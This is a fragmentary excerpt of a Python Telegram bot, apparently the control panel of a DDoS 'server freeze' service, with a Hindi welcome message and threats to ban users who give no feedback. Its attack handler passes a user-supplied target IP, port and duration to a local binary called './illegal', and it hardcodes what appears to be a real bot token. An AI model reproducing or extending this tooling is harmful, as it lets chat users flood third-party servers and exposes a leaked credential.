...
TOKEN = "7766019731:AAHN2-5PRVK4vNswHecV-4ms--hvXg1u9Do"
...
def handle_start(message):
    if message.chat.type == 'group':
        ...
        welcome_message = f"""
*स्वागत है  𝙄𝙂𝙇 𝘽𝙇𝘼𝘾𝙆 𝙋𝘼𝙉𝘿𝘼 𝙎𝙀𝙍𝙑𝙀𝙍 𝙁𝙍𝙀𝙀𝙕𝙀
   में!* 🚀  
 से अपडेट्स के लिए जुड़ें।
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, "⚠️ If you do not provide feedback, you may be banned from the group. plz provide feedback @BLACK_PANDA071")
...
async def run_attack_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./illegal {target_ip} {target_port} {duration} {9} {900}",
